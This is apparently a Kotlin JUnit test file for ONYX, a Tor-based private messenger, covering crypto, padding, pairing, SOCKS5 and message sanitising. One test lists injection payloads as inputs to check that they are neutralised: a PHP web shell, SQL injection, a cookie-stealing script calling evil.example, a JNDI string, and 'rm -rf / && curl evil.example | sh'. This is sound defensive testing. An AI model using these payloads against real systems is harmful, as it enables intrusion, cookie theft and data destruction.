// SPDX-License-Identifier: AGPL-3.0-only
package io.github.proteu5.onyx.core

import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.net.ServerSocket
import java.security.MessageDigest
import kotlin.concurrent.thread

class CoreTest {

    private inline fun <reified T : Throwable> assertFails(block: () -> Unit) {
        try { block() } catch (t: Throwable) { if (t is T) return; throw t }
        fail("expected ${T::class.java.simpleName}")
    }

    // ---------- SHA3 / onion ----------

    @Test fun sha3MatchesJdk() {
        val jdk = MessageDigest.getInstance("SHA3-256")
        for (len in listOf(0, 1, 55, 135, 136, 137, 271, 272, 1000)) {
            val msg = Bytes.random(len)
            assertArrayEquals("len=$len", jdk.digest(msg), Sha3.sha3_256(msg))
        }
    }

    @Test fun sha3KnownVector() {
        // FIPS 202 SHA3-256("abc")
        assertEquals(
            "3a985da74fe225b2045c172d6bd390bd855f086e3e9d525b46bfe24511431532",
            Bytes.hex(Sha3.sha3_256("abc".toByteArray()))
        )
    }

    @Test fun onionKnownAddressParses() {
        // The Tor Project's own v3 onion (published at torproject.org)
        val a = OnionAddress.parse("2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion")
        assertEquals("2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion", a.hostname)
    }

    @Test fun onionRoundTripAndChecksum() {
        val pk = Bytes.random(32)
        val a = OnionAddress.fromPublicKey(pk)
        assertEquals(56, a.label.length)
        assertEquals(a, OnionAddress.parse(a.hostname))
        val chars = a.label.toCharArray()
        chars[10] = if (chars[10] == 'a') 'b' else 'a'
        assertFails<MalformedException> { OnionAddress.parse(String(chars)) }
        assertFails<MalformedException> { OnionAddress.parse("example.com") }
    }

    @Test fun base32RoundTrip() {
        for (len in 0..40) {
            val b = Bytes.random(len)
            assertArrayEquals(b, Base32.decode(Base32.encode(b)))
        }
    }

    // ---------- HKDF (RFC 5869 test case 1) ----------

    @Test fun hkdfRfc5869Case1() {
        fun h(s: String) = s.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        val prk = Kdf.extract(h("000102030405060708090a0b0c"), h("0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b"))
        assertEquals("077709362c2e32df0ddc3f0dc47bba6390b6c73bb50f9c3122ec844ad7c2b3e5", Bytes.hex(prk))
        val okm = Kdf.expand(prk, h("f0f1f2f3f4f5f6f7f8f9"), 42)
        assertEquals(
            "3cb25f25faacd57a90434f64d0362f2a2d2d0a90cf1a5a4c5db02d56ecc4c5bf34007208d5b887185865",
            Bytes.hex(okm)
        )
    }

    // ---------- padding ----------

    @Test fun paddingHidesLength() {
        assertEquals(256, Padding.pad(ByteArray(0)).size)
        assertEquals(256, Padding.pad(ByteArray(255)).size)
        assertEquals(1024, Padding.pad(ByteArray(256)).size)
        for (len in listOf(0, 1, 100, 255, 256, 5000)) {
            val d = Bytes.random(len)
            assertArrayEquals(d, Padding.unpad(Padding.pad(d)))
        }
    }

    @Test fun paddingRejectsGarbage() {
        assertFails<MalformedException> { Padding.unpad(ByteArray(256)) }       // all zero
        assertFails<MalformedException> { Padding.unpad(ByteArray(100)) }       // not a bucket
    }

    // ---------- frames ----------

    @Test fun framesRoundTripAndArePadded() {
        val bos = ByteArrayOutputStream()
        val w = FrameCodec(ByteArrayInputStream(ByteArray(0)), bos)
        val frames = listOf(
            Frame.Challenge(Bytes.random(32)),
            Frame.Hello(Bytes.random(32), Bytes.random(32)),
            Frame.Welcome(Bytes.random(32)),
            Frame.Message(3, Bytes.random(1700)),
            Frame.Ack(Bytes.random(16)),
            Frame.Reject, Frame.Bye,
        )
        frames.forEach { w.write(it) }
        val wire = bos.toByteArray()
        val r = FrameCodec(ByteArrayInputStream(wire), ByteArrayOutputStream())
        frames.forEach { expected ->
            val got = r.read()
            assertEquals(expected.type, got.type)
            assertArrayEquals(expected.body(), got.body())
        }
        // Every frame occupies a bucket: 4-byte length + bucket bytes.
        assertEquals(0, (wire.size - 4 * frames.size) % 1024)
    }

    @Test fun wireTapSeesExactPaddedBytesAndNoPlaintext() {
        val secret = "super secret plaintext".toByteArray()
        val bos = ByteArrayOutputStream()
        val w = FrameCodec(ByteArrayInputStream(ByteArray(0)), bos)
        val seen = ArrayList<Triple<WireDirection, Int, ByteArray>>()
        w.tap = { d, t, b -> seen += Triple(d, t, b) }
        val ct = Bytes.random(183)                       // stands in for libsignal ciphertext
        w.write(Frame.Message(2, ct))
        assertEquals(1, seen.size)
        assertEquals(WireDirection.OUT, seen[0].first)
        assertArrayEquals(bos.toByteArray(), seen[0].third) // tap == exact bytes on the wire
        assertEquals(1028, seen[0].third.size)
        assertFalse(String(seen[0].third, Charsets.ISO_8859_1).contains(String(secret)))
        val desc = WireAnatomy.describe(seen[0].second, seen[0].third)
        assertTrue(desc.contains("bucket 1024 B")); assertTrue(desc.contains("Triple Ratchet"))
        // reader side tap
        val r = FrameCodec(ByteArrayInputStream(bos.toByteArray()), ByteArrayOutputStream())
        var inSeen: ByteArray? = null
        r.tap = { d, _, b -> assertEquals(WireDirection.IN, d); inSeen = b }
        r.read()
        assertArrayEquals(bos.toByteArray(), inSeen!!)
        assertTrue(WireAnatomy.hexDump(inSeen!!, 32).startsWith("00000000  00 00 04 00"))
    }

    @Test fun linkAuthIdentifiesOnlyTheRightContact() {
        val keys = (1..5).map { "c$it" to Bytes.random(32) }
        val nonceS = Bytes.random(32); val nonceC = Bytes.random(32)
        val hello = Frame.Hello(nonceC, LinkAuth.helloTag(keys[3].second, nonceS, nonceC))
        assertEquals("c4", LinkAuth.identify(keys, nonceS, hello))
        // Replay against a fresh server challenge fails.
        assertNull(LinkAuth.identify(keys, Bytes.random(32), hello))
        // Stranger fails.
        assertNull(LinkAuth.identify(keys, nonceS, Frame.Hello(nonceC, Bytes.random(32))))
    }

    // ---------- pairing ----------

    @Test fun pairingHappyPath() {
        val now = 1_800_000_000L
        val bOnion = OnionAddress.fromPublicKey(Bytes.random(32))
        val bIdentity = Bytes.random(33)
        val code = Pairing.Code.create(bOnion, bIdentity, now)
        val text = code.encode()
        assertTrue(text.length < 160)

        // A scans
        val scanned = Pairing.Code.decode(text)
        assertFalse(scanned.isExpired(now + 60))
        assertTrue(scanned.isExpired(now + 601))
        val aKeys = scanned.keys
        val req = Pairing.Request.create(aKeys, Bytes.random(33), Bytes.random(32), null)

        // B receives
        val bKeys = code.keys
        val reqRx = Pairing.Request.decode(req.encode())
        assertTrue(reqRx.verify(bKeys))
        val bundle = PreKeyBundleWire(1, 1, 7, Bytes.random(33), 2, Bytes.random(33), Bytes.random(64),
            bIdentity, 3, Bytes.random(1569), Bytes.random(64))
        val resp = Pairing.Response.create(bKeys, reqRx, bundle.encode(), Bytes.random(32))

        // A verifies
        val respRx = Pairing.Response.decode(resp.encode())
        assertTrue(respRx.verify(aKeys, req))
        val bundleRx = PreKeyBundleWire.decode(respRx.bundle)
        assertArrayEquals(scanned.identityCommit, Bytes.sha256(bundleRx.identityKey))
        assertArrayEquals(aKeys.linkKey, bKeys.linkKey)
    }

    @Test fun pairingRejectsWrongSecretAndTampering() {
        val code = Pairing.Code.create(OnionAddress.fromPublicKey(Bytes.random(32)), Bytes.random(33), 0)
        val other = Pairing.Code.create(code.onion, Bytes.random(33), 0)
        val req = Pairing.Request.create(other.keys, Bytes.random(33), Bytes.random(32), null)
        assertFalse(req.verify(code.keys))

        val good = Pairing.Request.create(code.keys, Bytes.random(33), Bytes.random(32), null)
        val tampered = good.encode().also { it[20] = (it[20].toInt() xor 1).toByte() }
        assertFalse(Pairing.Request.decode(tampered).verify(code.keys))

        val resp = Pairing.Response.create(code.keys, good, Bytes.random(100), null)
        // Response bound to a different request must fail.
        val req2 = Pairing.Request.create(code.keys, Bytes.random(33), Bytes.random(32), null)
        assertFalse(resp.verify(code.keys, req2))
    }

    @Test fun pairingCodeRejectsJunk() {
        assertFails<MalformedException> { Pairing.Code.decode("https://evil.example") }
        assertFails<MalformedException> { Pairing.Code.decode("onyx1:!!!") }
        assertFails<MalformedException> { Pairing.Code.decode("onyx1:AQ") }
    }

    @Test fun remoteInviteRoundTripIsFlaggedAndExtractable() {
        val now = 1_800_000_000L
        val code = Pairing.Code.createRemote(OnionAddress.fromPublicKey(Bytes.random(32)), Bytes.random(33), now)
        val text = code.encode()
        val shared = "Hey, join me on ONYX:\n$text\n(valid 24h)"
        val found = Pairing.Code.extract(shared)
        assertEquals(text, found)
        val d = Pairing.Code.decode(found!!)
        assertTrue(d.remote)
        assertFalse(d.isExpired(now + 23 * 3600))
        assertTrue(d.isExpired(now + 24 * 3600 + 1))
        assertFalse(Pairing.Code.decode(Pairing.Code.create(code.onion, Bytes.random(33), now).encode()).remote)
        assertNull(Pairing.Code.extract("no code here onyx1:short"))
    }

    // ---------- message policy ----------

    private val forbidden = "<>{}[]`$\\|;=#%&*_@/^~+"

    private fun assertPolicy(out: String) {
        assertTrue("too long: ${out.length}", out.codePointCount(0, out.length) <= MessagePolicy.MAX_CHARS)
        out.forEach { c -> assertFalse("forbidden '$c' in \"$out\"", forbidden.indexOf(c) >= 0) }
        assertFalse(out.contains('\n'))
        // no two symbols adjacent (ignoring spaces)
        val compact = out.replace(" ", "")
        for (i in 1 until compact.length) {
            val a = compact[i - 1]; val b = compact[i]
            assertFalse("consecutive symbols in \"$out\"", !a.isLetterOrDigit() && !b.isLetterOrDigit() && !Character.isSurrogate(a) && !Character.isSurrogate(b))
        }
    }

    @Test fun policyNeutralisesInjectionPayloads() {
        val payloads = listOf(
            "<?php system(\$_GET['c']); ?>",
            "'; DROP TABLE users; --",
            "<script>fetch('https://evil.example/?c='+document.cookie)</script>",
            "\${jndi:ldap://evil.example/a}",
            "rm -rf / && curl evil.example | sh",
            "{{7*7}} \${7*7} <%= 7*7 %>",
            "`whoami`; \$(id)",
            "=HYPERLINK(\"http://x\",\"y\")",
        )
        for (p in payloads) {
            val out = MessagePolicy.sanitize(p)
            assertPolicy(out)
        }
        assertEquals("?php system(GET'c'", MessagePolicy.sanitize("<?php system(\$_GET['c']); ?>"))
        assertEquals("' DROP TABLE users -", MessagePolicy.sanitize("'; DROP TABLE users; --"))
        assertEquals("jndi:ldap:evil.examplea", MessagePolicy.sanitize("\${jndi:ldap://evil.example/a}"))
    }

    @Test fun policyKeepsNormalConversation() {
        assertEquals("Hey! Are we still on for 7:30 tonight?", MessagePolicy.sanitize("Hey!! Are we still on for 7:30 tonight??"))
        assertEquals("Guten Tag, ça va? Привет 你好", MessagePolicy.sanitize("Guten Tag, ça va? Привет 你好"))
        assertEquals("ok 👍", MessagePolicy.sanitize("ok 👍👍👍"))
        assertEquals("line one line two", MessagePolicy.sanitize("line one\nline two"))
    }

    @Test fun policyStripsInvisiblesAndLookalikes() {
        assertEquals("admin", MessagePolicy.sanitize("ad\u200Bmin"))            // zero-width space
        assertEquals("abc", MessagePolicy.sanitize("\u202Eabc\u202C"))            // bidi override removed
        assertEquals("script", MessagePolicy.sanitize("\uFF1Cscript\uFF1E"))   // fullwidth < >
        assertEquals("", MessagePolicy.sanitize("<<<>>>{}\u0000\u200D"))
    }

    @Test fun policyTruncatesTo80CodePoints() {
        val out = MessagePolicy.sanitize("a".repeat(500))
        assertEquals(80, out.length)
        val emoji = MessagePolicy.sanitize("x😀".repeat(100))
        assertTrue(emoji.codePointCount(0, emoji.length) <= 80)
        assertFalse(Character.isHighSurrogate(emoji.last()))                  // never split a surrogate pair
    }

    @Test fun rateLimitStopsBulkSending() {
        val now = 1_000_000L
        assertTrue(MessagePolicy.rateAllowed(emptyList(), now))
        assertFalse(MessagePolicy.rateAllowed(listOf(now - 100), now))        // faster than 0.7 s
        assertTrue(MessagePolicy.rateAllowed(listOf(now - 1000), now))
        assertFalse(MessagePolicy.rateAllowed(List(20) { now - 50_000 + it }, now))  // 20/min cap
        assertTrue(MessagePolicy.rateAllowed(List(20) { now - 70_000 + it }, now))   // older than a minute
    }

    // ---------- envelope ----------

    @Test fun envelopeRoundTripAndBucketed() {
        val e = Envelope.text("hello ONYX", 1_790_000_000_000L)
        val p = e.encodePadded()
        assertEquals(256, p.size)
        val d = Envelope.decodePadded(p)
        assertEquals(Envelope.Kind.TEXT, d.kind)
        assertEquals("hello ONYX", String(d.body))
        assertEquals(1_790_000_000_000L / 60_000, d.sentAtMinute)
    }

    // ---------- SOCKS5 against a fake Tor ----------

    @Test fun socks5SendsHostnameNeverIp() {
        val onion = OnionAddress.fromPublicKey(Bytes.random(32))
        ServerSocket(0).use { ss ->
            var seenHost = ""
            val t = thread {
                ss.accept().use { c ->
                    val i = java.io.DataInputStream(c.getInputStream()); val o = c.getOutputStream()
                    i.readFully(ByteArray(3)); o.write(byteArrayOf(5, 0))
                    val hdr = ByteArray(4); i.readFully(hdr)
                    assertEquals(3, hdr[3].toInt()) // ATYP = domain name
                    val host = ByteArray(i.readUnsignedByte()); i.readFully(host); i.readFully(ByteArray(2))
                    seenHost = String(host)
                    o.write(byteArrayOf(5, 0, 0, 1, 0, 0, 0, 0, 0, 0))
                    o.write("pong".toByteArray()); o.flush()
                }
            }
            Socks5.connect(ss.localPort, onion, 9878).use { s ->
                val buf = ByteArray(4); java.io.DataInputStream(s.getInputStream()).readFully(buf)
                assertEquals("pong", String(buf))
            }
            t.join()
            assertEquals(onion.hostname, seenHost)
        }
    }

    @Test fun socks5SurfacesOnionErrors() {
        val onion = OnionAddress.fromPublicKey(Bytes.random(32))
        ServerSocket(0).use { ss ->
            val t = thread {
                ss.accept().use { c ->
                    val i = java.io.DataInputStream(c.getInputStream()); val o = c.getOutputStream()
                    i.readFully(ByteArray(3)); o.write(byteArrayOf(5, 0))
                    i.readFully(ByteArray(4)); i.readFully(ByteArray(i.readUnsignedByte())); i.readFully(ByteArray(2))
                    o.write(byteArrayOf(5, 0xF0.toByte(), 0, 1, 0, 0, 0, 0, 0, 0)); o.flush()
                }
            }
            try {
                Socks5.connect(ss.localPort, onion, 9878); fail("should throw")
            } catch (e: Socks5.SocksException) {
                assertTrue(e.message!!.contains("offline"))
            }
            t.join()
        }
    }

    // ---------- SMS ----------

    @Test fun smsFixedPartsAndReassembly() {
        val ct = Bytes.random(300)
        val parts = SmsCodec.encode(2, ct)
        assertEquals(SmsCodec.PARTS_PER_MESSAGE, parts.size)
        parts.forEach { assertTrue(it.length <= SmsCodec.MAX_CHARS) }
        // Two different-sized messages produce identical part lengths.
        assertEquals(parts.map { it.length }, SmsCodec.encode(2, Bytes.random(10)).map { it.length })
        val r = SmsCodec.Reassembler()
        assertNull(r.offer("+1555", parts[2])); assertNull(r.offer("+1555", parts[0])); assertNull(r.offer("+1555", parts[3]))
        val (type, got) = r.offer("+1555", parts[1])!!
        assertEquals(2, type); assertArrayEquals(ct, got)
        assertNull(r.offer("+1555", "hey, normal text"))
    }

    // ---------- transport ----------

    @Test fun transportNeverDowngradesToSmsWhileTorWorks() {
        val base = TransportContext(true, null, true, false, smsAllowedForContact = true, hasCellular = true)
        assertEquals(listOf(Transport.TOR_DIRECT, Transport.TOR_MAILBOX), TransportSelector.plan(base))
        assertEquals(listOf(Transport.SMS), TransportSelector.plan(base.copy(torReady = false)))
        assertEquals(emptyList<Transport>(), TransportSelector.plan(base.copy(torReady = false, smsAllowedForContact = false)))
        val d = TransportSelector.retryDelayMs(20, 1.0)
        assertTrue(d <= 45 * 60_000L)
    }

    // ---------- Forge rank ----------

    @Test fun forgeTiers() {
        fun t(h: Long, p: Long, on: Boolean = true) = ForgeRank.tierFor(ForgeRank.Stats(h * 3600, p, on))
        assertEquals(ForgeRank.Tier.NONE, t(5000, 99999, on = false))
        assertEquals(ForgeRank.Tier.EMBER, t(0, 0))
        assertEquals(ForgeRank.Tier.SPARK, t(10, 0))
        assertEquals(ForgeRank.Tier.SPARK, t(0, 25))
        assertEquals(ForgeRank.Tier.FLAME, t(49, 250))
        assertEquals(ForgeRank.Tier.FORGE, t(200, 0))
        assertEquals(ForgeRank.Tier.CRUCIBLE, t(0, 5000))
    }

    @Test fun badgeCarriesOnlyTierAndCover() {
        val b = ForgeRank.Badge(ForgeRank.Tier.FLAME, ForgeRank.Cover.SIGIL)
        val enc = b.encode()
        assertEquals(3, enc.size)
        assertEquals(b, ForgeRank.Badge.decode(enc))
    }

    @Test fun snowflakeGuardrails() {
        val g = ForgeRank.Guardrails(true, true, true, 0, 1_000_000)
        assertTrue(g.allowed())
        assertFalse(g.copy(charging = false).allowed())
        assertFalse(g.copy(onUnmeteredWifi = false).allowed())
        assertFalse(g.copy(bytesToday = 1_000_000).allowed())
        assertFalse(g.copy(userEnabled = false).allowed())
    }
}
